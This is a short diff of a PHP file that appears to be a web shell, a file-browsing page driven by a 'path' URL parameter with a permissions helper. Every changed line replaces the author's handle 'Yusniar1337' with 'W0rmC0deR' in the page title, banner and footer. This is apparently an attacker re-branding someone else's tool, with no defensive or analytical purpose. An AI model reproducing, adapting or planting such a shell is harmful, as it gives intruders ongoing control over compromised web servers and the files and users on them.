@@ -12,7 +12,7 @@ echo '<!DOCTYPE HTML>
 <HTML>
 <HEAD>
 <link href="" rel="stylesheet" type="text/css">
-<title>Yusniar1337</title><link rel="SHORTCUT ICON"  href="https://vignette.wikia.nocookie.net/aphmau/images/0/03/5892e7f3cc64c8a912e2494a3ff77e08--neko-girl-cute-anime-girls-cute-kawaii.jpg/revision/latest?cb=20170707151614">
+<title>W0rmC0deR</title><link rel="SHORTCUT ICON"  href="https://vignette.wikia.nocookie.net/aphmau/images/0/03/5892e7f3cc64c8a912e2494a3ff77e08--neko-girl-cute-anime-girls-cute-kawaii.jpg/revision/latest?cb=20170707151614">
 <style>
 body{
 	font-family: "Racing Sans One", cursive;
@@ -57,7 +57,7 @@ border-radius:5px;
 </style>
 </HEAD>
 <BODY>
-<H1><center><font color="Red">$ Yusniar1337 $</font></center></H1>
+<H1><center><font color="Red">$ W0rmC0deR $</font></center></H1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>Current Path : ';
 if(isset($_GET['path'])){
@@ -240,7 +240,7 @@ echo "</center></td>
 echo '</table>
 </div>';
 }
-echo '<br /><font color="Purple"></font><font color="Purple">Yusniar1337</font>
+echo '<br /><font color="Purple"></font><font color="Purple">W0rmC0deR</font>
 </BODY>
 </HTML>';
 function perms($file){
